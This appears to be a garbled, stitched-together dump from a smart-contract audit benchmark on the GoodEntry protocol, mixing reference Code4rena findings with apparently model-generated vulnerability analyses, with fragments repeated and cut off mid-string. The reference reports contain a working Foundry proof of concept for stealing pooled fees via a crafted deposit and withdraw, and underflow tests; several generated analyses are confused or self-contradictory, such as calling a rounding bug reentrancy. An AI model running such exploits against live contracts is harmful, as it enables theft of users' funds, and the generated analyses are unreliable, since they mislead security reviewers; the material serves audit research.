There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

If another liquidity provider attempts to deposit into the pool after this manipulation, their share allocation may be rounded down to zero due to the small initial liquidity provided by the attacker.

        "gt": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

To mitigate this issue, the transfer function should be called only after the fee values have been computed to ensure that the correct, non-zero fee amounts are transferred to the appropriate recipients.\n\nHowever, the smart contract code provided does not contain any such function or operation that could lead to inconsistent contract states and burned fees.

If there are no new fees generated, the function exits early without compounding the fees or executing any further logic.\n\nIf new fees are generated, the function computes and transfers the appropriate fee amounts to the treasury based on the current treasury fee percentage. The function then updates the contract's state with the newly transferred fees by calling `safeIncreaseAllowance()` on both tokens and increasing the liquidity of the Uniswap pool using the `increaseLiquidity()` function from the `POS_MGR` contract.\n\nTherefore, based on the provided smart contract code and vulnerability knowledge, it is not possible for the identified vulnerability type to occur in this contract.

Incorrect balance calculation: The function `returnExpectedBalanceWithoutFees()` is used to calculate the expected balance of the Uniswap position without the collected fees. However, it does not take into account the potential increase in liquidity due to compounding. Therefore, if there is a significant increase in liquidity due to compounding, the function may return an incorrect balance, leading to errors in fee collection and loss of profit for the protocol.\n2. Unintended fees: If the collected fees are not added to the pool correctly, they can end up being distributed to other users or sent to a wrong address. This can cause issues during fee collection and lead to loss of profit for the protocol.\n3. Slippage attack: The function uses `safeIncreaseAllowance()` from the Uniswap position manager to increase the liquidity, which is vulnerable to a slippage attack if the price changes rapidly. If the prices change significantly during the compounding process, the fees collected could be sold at a different price, leading to loss of profit for the protocol.\n\nTo mitigate these vulnerabilities, it is recommended that the function `claimFee()` includes an explicit check on the added liquidity and fee collection, as well as using a separate address or contract for storing protocol fees to prevent mixing them with users' assets.

These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

Incorrect price update mechanism: The function `returnExpectedBalanceWithoutFees` takes in two parameters, `TOKEN0_PRICE` and `TOKEN1_PRICE`, which represent the prices of the tokens being traded. However, if these values are 0, they are fetched from an oracle using the `ORACLE.getAssetPrice()` function. This means that even if the oracle returns up-to-date prices, the smart contract may still use outdated prices if the `TOKEN0_PRICE` and `TOKEN1_PRICE` values are 0.\n2. Inaccurate liquidity weightings: The function then calculates the amount of tokens needed for a given level of liquidity using the `LiquidityAmounts.getAmountsForLiquidity()` function. However, this calculation relies on the outdated prices passed in as parameters if `TOKEN0_PRICE` and `TOKEN1_PRICE` are 0. This means that the liquidity weightings may be inaccurate due to using outdated prices.\n3. Unintended consequences: The vulnerability can lead to unintended consequences, such as incorrect market representations and skewed pricing data. For example, if a trader buys tokens at a low price and then sells them at a high price, the smart contract may not accurately reflect this trade due to using outdated prices for liquidity weightings. This can lead to potential manipulation or other unintended consequences.\n\nBased on these factors, I would say that the smart contract is vulnerable to the Time-Weighted Average Price (TWAP) implementation being inaccurate due to the use of outdated prices. The recommended mitigation is to update the arrays storing the previous prices of the tokens after syncing the respective prices to ensure the most up-to-date price is used when performing liquidity evaluations for all available token pairs, which will maintain the accuracy",

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

The `getTokenAmountsExcludingFees()` function takes an `amount` parameter and returns the token amounts that would be added to the pool if that much liquidity were provided.\n2. The function first retrieves the address of a Uniswap V3 pool from the `V3_FACTORY` mapping using the addresses of the two tokens being pooled and a fee tier multiplied by 100.\n3.

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

The reason for this vulnerability is that the calculation for minting LP tokens is based on the ratio of newly added quote tokens to the current wallet balance of quote tokens in the smart contract, which can be manipulated by malicious actors by transferring tokens to the contract.\n\nThe code exposes a function `getTokenAmountsExcludingFees` that accepts an amount as input and returns two amounts: `token0Amount` and `token1Amount`. The first step in this function is to retrieve the address of the liquidity pool using `V3_FACTORY.getPool`, which takes three arguments: the addresses of token 0 and token 1, and a fee tier. This means that any malicious actor can provide the same fee tier as the original LP and manipulate the balance of quote tokens within the smart contract by transferring tokens to the contract, effectively inflating the balance and causing future LP token minting to be undervalued.\n\nThe second step in this function is to retrieve the current price of the liquidity pool using `IUniswapV3Pool(pool).slot0()` and calculate the amount of LP tokens that would be minted for a given amount of quote tokens using `LiquidityAmounts.getAmountsForLiquidity`. The calculation takes into account the current price, the ratio of newly added quote tokens to the current wallet balance of quote tokens in the smart contract, and the total supply of LP tokens.

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

The issue arises in the `deposit` function when calculating the new liquidity provider's share.\n\nThe contract uses a naive approach where it assumes that the new liquidity provider will receive an equal share of the pool, based on their deposit size relative to the total pool liquidity. However, this assumption is incorrect if the pool has not been fully utilized yet and there are still some leftover liquidity tokens that have not been distributed yet.\n\nTo exploit this vulnerability, an attacker can deposit a very small amount of liquidity into the pool, which will cause the `deposit` function to round down their share of the pool to zero. This allows the attacker to essentially steal assets from other liquidity providers who have provided more value than they did.\n\nThe specific type of vulnerability is a \"reentrancy\" attack, where an attacker can cause a contract to call itself recursively and execute malicious code without permission. In this case, the `deposit` function calls the `claimFee` function, which in turn may trigger another deposit into the pool, leading to a recursive loop that allows the attacker to repeatedly withdraw fees until they have drained the entire pool of assets.\n\nTo fix this vulnerability, the contract should calculate the new liquidity provider's share using a more accurate method, such as the ratio of their deposit size to the total pool liquidity after taking into account any existing leftover liquidity tokens that have not been distributed yet. Additionally, the `deposit` function should be modified to use a non-reentrant modifier to prevent recursive calls and ensure that the contract's state is not corrupted by malicious attackers.",

This attack is a type of flash loan or front-running attack where an attacker deposits a small amount of liquidity into the pool and then quickly transfers a large amount of attributions to the pool, effectively causing other liquidity providers' shares to be rounded down to zero.\n\nThe vulnerability is caused by the improper handling of the smallest possible amount deposited and attributions during the calculation of new liquidity provider shares. Specifically, the contract does not take into account that when an attacker deposits a small amount of liquidity, the amount they get may round down to zero due to the small initial liquidity provided. This allows the attacker to obtain higher shares of the pool than they should.\n\nTo exploit this vulnerability, an attacker can generate a Proof of Concept (PoC) by first depositing a small amount of liquidity into the pool and then transferring a large amount of attributions to the pool. The contract will then round down the attacker's shares to zero, effectively allowing them to steal funds from other liquidity providers.\n\nTo mitigate this vulnerability, the smart contract code should be updated to properly handle the smallest possible amount deposited and attributions during the calculation of new liquidity provider shares. This can be done by adding checks to ensure that an attacker's share is not rounded down to zero due to a small initial liquidity provided.

        "gt": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 